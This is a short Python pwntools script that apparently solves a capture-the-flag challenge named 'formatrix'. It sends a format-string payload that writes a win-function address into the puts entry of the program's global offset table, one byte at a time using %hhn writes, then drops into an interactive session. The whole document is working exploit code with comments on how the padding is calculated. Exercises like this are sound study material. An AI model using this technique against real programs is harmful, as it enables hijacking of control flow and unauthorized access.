#!/usr/bin/env python2

from pwn import *

p = process('./formatrix')

p.recvuntil('You say: ', drop=True)

winAddr = p32(0x08048536) 
win0 = 0x36
win1 = 0x85
win2 = 0x04
win3 = 0x08

#target address is address of puts entry in .got
targetAddr = 0x08049C18
Addr0 = p32(targetAddr)
Addr1 = p32(targetAddr + 1)
Addr2 = p32(targetAddr + 2)
Addr3 = p32(targetAddr + 3)

payload = "{}{}{}{}".format(Addr0, Addr1, Addr2, Addr3)

#offset is the number of bytes output by sprintf before any padding
#offset = 4 addresses = 16 bytes
offset = 16

#write win0 bytes to Addr1 
#%{}x will output something from the stack, padded to {} number of bytes
payload += "%{}x%3$hhn".format(win0 - offset)

#write win1 (0x85) bytes to Addr1
payload += "%{}x%4$hhn".format(win1 - win0)

# write win2 (0x04) bytes to Addr2
# have written 0x85 bytes so far
# padding = 0x104 - the 85 bytes written so far
payload += "%{}x%5$hhn".format(0x100 + win2 - win1)

# write win3 (0x08) bytes to Addr3
# have written 0x04 bytes so far
# padding = 0x108 - the 04 bytes written so far
payload += "%{}x%6$hhn".format(0x100 + win3 - win2)

p.sendline(payload)

p.interactive()
